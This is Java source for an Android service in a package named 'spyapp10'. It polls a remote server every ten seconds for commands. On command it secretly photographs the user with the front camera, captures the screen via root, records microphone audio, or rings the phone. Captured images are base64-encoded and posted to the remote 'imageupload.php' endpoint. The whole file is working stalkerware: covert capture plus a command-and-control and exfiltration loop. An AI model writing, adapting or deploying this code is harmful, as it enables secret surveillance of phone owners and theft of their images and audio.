package com.example.vipul.spyapp10;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

public class livePannelService extends Service {
    private Camera mCamera;
    private SurfaceHolder sHolder;
    private Camera.Parameters parameters;
    String DID;
    public livePannelService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);

        String email = MainActivity.EMAIL;
        DID= Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);

        final Thread runnable = new Thread() {
            @Override
            public void run() {
                while(true){
                    try {
                        new ShowUserDetails().execute(DID);
                        sleep(10000);
                    } catch (Exception e) {
                    }
                }
            }
        };
        runnable.start();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    public void playRingtone() {
        Uri notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
        Ringtone r = RingtoneManager.getRingtone(getApplicationContext(), notification);
        AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
        if(!r.isPlaying()) {
            r.play();
        }
    }
    public void captureScreen(){
        try {
            Process sh = Runtime.getRuntime().exec("su", null,null);
            OutputStream os = sh.getOutputStream();
            os.write(("/system/bin/screencap -p " + "/sdcard/img.png").getBytes("ASCII"));
            os.flush();
            os.close();
            sh.waitFor();
            Bitmap bitmap = BitmapFactory.decodeFile(Environment.getExternalStorageDirectory() +
                    File.separator + "img.png");
            ByteArrayOutputStream bao=new ByteArrayOutputStream();
            if (bitmap != null) {
                bitmap.compress(Bitmap.CompressFormat.JPEG,30,bao );
            }
            byte[] ba=bao.toByteArray();
            String imm= Base64.encodeToString(ba, Base64.DEFAULT);
            new sendDataToDashboard().execute(DID,imm,"1");
        } catch (Exception e) {
            Log.e("status1111ss", e.toString());
        }
    }
    public void captureAudio(){
        final Thread runnable = new Thread() {
            @Override
            public void run() {
                try {
                    MediaRecorder recorder = new MediaRecorder();
                    recorder.reset();
                    recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    recorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
                    File file = createDirIfNotExists("audio1");
                    recorder.setOutputFile(file.getAbsolutePath());
                    recorder.prepare();
                    recorder.start();
                    sleep(30000);
                    Log.e("vipul1_folder", "stopped");
                    recorder.stop();
                    recorder.reset();
                    recorder.release();
                    recorder = null;
                    File file2 = new File(Environment.getExternalStorageDirectory() + "/audio1.3GPP");
                    //byte[] binaryData = new byte[(int) file2.length()];
                    // byte[] bytes = FileUtils.readFileToByteArray(file);
                    // String imm= Base64.encodeToString(bytes, Base64.DEFAULT);
                    //send audio here
                    // new UpdateUserDetailreset().execute(DID,imm);
                } catch (Exception e) {
                    Log.e("errorinService1", e.toString());
                }
            }
        };
        runnable.start();
    }
    public void takePicture() {
        int numberOfCameras = Camera.getNumberOfCameras();
        Camera.CameraInfo ci = new Camera.CameraInfo();
        for (int i = 0; i < numberOfCameras; i++) {
            Camera.getCameraInfo(i, ci);
            if (ci.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                mCamera = Camera.open(i);
                Log.e("errorincode", i + "");
            }
        }
        final SurfaceView sv = new SurfaceView(getApplicationContext());
        try {
            mCamera.setPreviewDisplay(sv.getHolder());
        } catch (IOException e) {
            e.printStackTrace();
        }
        parameters = mCamera.getParameters();
        mCamera.setParameters(parameters);
        mCamera.startPreview();
        sHolder = sv.getHolder();
        sHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);
        mCamera.takePicture(null, null, mCall);
    }
    Camera.PictureCallback  mCall = new Camera.PictureCallback() {
        public void onPictureTaken(byte[] data, Camera camera) {
            FileOutputStream outStream = null;
            try {
                String imm=getStringImage(data);
                new sendDataToDashboard().execute(DID,imm,"2");
                mCamera.release();
            } catch (Exception e) {
                Log.d("CAMERA", e.getMessage());
            }
        }
    };
    private class ShowUserDetails extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {
            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/livestatus.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(1);
                nameValuePair.add(new BasicNameValuePair("did", params[0]));
                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                Log.e("status111","inside show method");
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
                Log.e("status11111", e.toString());
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            try {
                super.onPostExecute(jsonObject);
                Log.e("status1110", jsonObject.toString());
                char status = jsonObject.toString().charAt(8);
                Log.e("status111",status+"");
                if(status==('1')){
                    new UpdateUserDetail().execute(DID);
                    takePicture();
                }else if (status==('2')){
                    new UpdateUserDetail().execute(DID);
                    captureScreen();
                }else if (status==('3')){
                    new UpdateUserDetail().execute(DID);
                    captureAudio();
                }else if (status==('4')){
                    new UpdateUserDetail().execute(DID);
                    playRingtone();
                }else {
                }
            } catch (Exception e) {
                Log.e("status1112", e.toString());
            }
        }
    }
    private class UpdateUserDetail extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {
            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/ack.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(1);
                nameValuePair.add(new BasicNameValuePair("did", params[0]));

                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            super.onPostExecute(jsonObject);
            String status = null;
            try {
                status = jsonObject.getString("code");
            } catch (Exception e) {
            }
        }
    }
    private class sendDataToDashboard extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {
            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/imageupload.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(4);
                nameValuePair.add(new BasicNameValuePair("did", params[0]));
                nameValuePair.add(new BasicNameValuePair("image", params[1]));
                nameValuePair.add(new BasicNameValuePair("type", params[2]));

                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            super.onPostExecute(jsonObject);
            String status = null;
            try {
                status = jsonObject.getString("code");
            } catch (Exception e) {
            }
        }
    }
    public File createDirIfNotExists(String path) {
        File folder = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
        if (!folder.exists()) {
            if (!folder.mkdirs()) {
                Log.e("vipul1_folder", "folder is created");
            }
        }
        File file = new File(folder, path + ".3GPP");
        try {
            if (!file.exists()) {
                if (file.createNewFile()) {
                    Log.e("vipul1_file", "file is created");
                }
            }
        } catch (IOException e) {
        }
        return file;
    }

    public String getStringImage(byte[] imageBytes){
        String encodedImage = Base64.encodeToString(imageBytes, Base64.DEFAULT);
        return encodedImage;
    }
}
